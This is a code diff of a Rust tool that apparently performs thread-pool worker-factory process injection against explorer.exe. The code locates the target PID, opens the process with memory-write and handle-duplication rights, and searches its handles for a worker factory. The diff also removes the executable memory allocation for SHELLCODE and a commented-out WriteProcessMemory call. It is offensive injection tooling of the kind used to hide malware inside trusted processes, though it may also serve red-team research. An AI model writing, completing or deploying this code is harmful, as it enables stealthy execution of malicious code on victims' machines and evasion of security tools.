@@ -1,32 +1,26 @@
 #![allow(non_snake_case)]
-// use std::{os::raw::c_void, ptr::null_mut};
-use ntapi::ntexapi::{
-    NtQueryInformationWorkerFactory, NtSetInformationWorkerFactory,
-    WORKER_FACTORY_BASIC_INFORMATION, WorkerFactoryBasicInformation, WorkerFactoryThreadMinimum,
+use ntapi::{
+    ntexapi::{
+        NtQueryInformationWorkerFactory, NtQuerySystemInformation, NtSetInformationWorkerFactory,
+        WORKER_FACTORY_BASIC_INFORMATION, WorkerFactoryBasicInformation,
+        WorkerFactoryThreadMinimum,
+    },
+    ntobapi::{NtQueryObject, OBJECT_TYPE_INFORMATION, ObjectTypeInformation},
+    ntpsapi::{NtQueryInformationProcess, ProcessHandleInformation},
 };
 use std::{ffi::c_void, ptr::null_mut};
-use windows_sys::{
-    Wdk::{
-        Foundation::{NtQueryObject, ObjectTypeInformation},
-        System::{
-            SystemInformation::NtQuerySystemInformation,
-            Threading::{NtQueryInformationProcess, ProcessHandleInformation},
-        },
+use windows_sys::Win32::{
+    Foundation::{
+        CloseHandle, DUPLICATE_SAME_ACCESS, DuplicateHandle, STATUS_INFO_LENGTH_MISMATCH,
     },
-    Win32::{
-        Foundation::{
-            CloseHandle, DUPLICATE_SAME_ACCESS, DuplicateHandle, STATUS_INFO_LENGTH_MISMATCH,
-            UNICODE_STRING,
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, VirtualAllocEx},
+        Threading::{
+            GetCurrentProcess, OpenProcess, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION,
+            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
         },
-        System::{
-            Diagnostics::Debug::WriteProcessMemory,
-            Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, VirtualAllocEx},
-            Threading::{
-                GetCurrentProcess, OpenProcess, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION,
-                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-            },
-            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
-        },
+        WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
     },
 };
 
@@ -38,45 +32,11 @@ struct HandleEntry {
     granted_access: u32,
 }
 
+#[allow(private_interfaces)]
 #[repr(C)]
 pub struct ProcessHandleInfo {
     pub NumberOfHandles: usize,
     pub Handles: [HandleEntry; 1],
-}
-
-#[repr(C)]
-pub struct GENERIC_MAPPING {
-    pub GenericRead: u32,
-    pub GenericWrite: u32,
-    pub GenericExecute: u32,
-    pub GenericAll: u32,
-}
-
-#[repr(C)]
-pub struct OBJECT_TYPE_INFORMATION {
-    pub TypeName: UNICODE_STRING,
-    pub TotalNumberOfObjects: u32,
-    pub TotalNumberOfHandles: u32,
-    pub TotalPagedPoolUsage: u32,
-    pub TotalNonPagedPoolUsage: u32,
-    pub TotalNamePoolUsage: u32,
-    pub TotalHandleTableUsage: u32,
-    pub HighWaterNumberOfObjects: u32,
-    pub HighWaterNumberOfHandles: u32,
-    pub HighWaterPagedPoolUsage: u32,
-    pub HighWaterNonPagedPoolUsage: u32,
-    pub HighWaterNamePoolUsage: u32,
-    pub HighWaterHandleTableUsage: u32,
-    pub InvalidAttributes: u32,
-    pub GenericMapping: GENERIC_MAPPING,
-    pub ValidAccessMask: u32,
-    pub SecurityRequired: u8,
-    pub MaintainHandleCount: u8,
-    pub TypeIndex: u8,
-    pub ReservedByte: i8,
-    pub PoolType: u32,
-    pub DefaultPagedPoolCharge: u32,
-    pub DefaultNonPagedPoolCharge: u32,
 }
 
 fn get_pid(proc_name: &str) -> u32 {
@@ -152,7 +112,7 @@ fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
         let mut return_length = 0;
 
         let status = NtQueryInformationProcess(
-            proc_handle,
+            proc_handle as *mut _,
             ProcessHandleInformation,
             buffer.as_mut_ptr() as *mut _,
             buffer_size as u32,
@@ -192,7 +152,7 @@ fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
 
             let mut return_length = 0;
             let status = NtQueryObject(
-                duplicated_handle,
+                duplicated_handle as *mut _,
                 ObjectTypeInformation,
                 null_mut(),
                 0,
@@ -211,7 +171,7 @@ fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
             let mut type_info_buffer = vec![0u8; buffer_size];
 
             let status = NtQueryObject(
-                duplicated_handle,
+                duplicated_handle as *mut _,
                 ObjectTypeInformation,
                 type_info_buffer.as_mut_ptr() as *mut _,
                 buffer_size as u32,
@@ -219,10 +179,6 @@ fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
             );
 
             if status != 0 {
-                // println!(
-                //     "[!] NtQueryObject failed for handle {:?}: {:X}",
-                //     handle.handle_value, status
-                // );
                 CloseHandle(duplicated_handle);
                 continue;
             }
@@ -249,7 +205,7 @@ fn find_worker_handle(proc_handle: *mut c_void) -> *mut c_void {
 }
 
 fn main() {
-    let proc_name = "explorer.exe";
+    let proc_name = "Explorer.exe";
 
     let pid = get_pid(proc_name);
 
@@ -275,43 +231,6 @@ fn main() {
             println!("[!] Failed to open process with PID: {}", pid);
             return;
         }
-
-        let remote_buffer = VirtualAllocEx(
-            proc_handle,
-            null_mut(),
-            SHELLCODE.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READ,
-        );
-
-        if remote_buffer.is_null() {
-            println!("[!] Failed to allocate memory in the target process");
-            return;
-        }
-
-        println!(
-            "[+] Allocated {} bytes at address: {:p}",
-            SHELLCODE.len(),
-            remote_buffer
-        );
-
-        // let mut bytes_written = 0;
-        // if WriteProcessMemory(
-        //     proc_handle,
-        //     remote_buffer,
-        //     SHELLCODE.as_ptr() as *const _,
-        //     SHELLCODE.len(),
-        //     &mut bytes_written,
-        // ) == 0
-        // {
-        //     println!(
-        //         "[!] Failed to write shellcode to the target process: {}",
-        //         std::io::Error::last_os_error()
-        //     );
-        //     return;
-        // }
-
-        // println!("[+] Written {} bytes to the target process", bytes_written);
 
         let worker_handle = find_worker_handle(proc_handle);
 
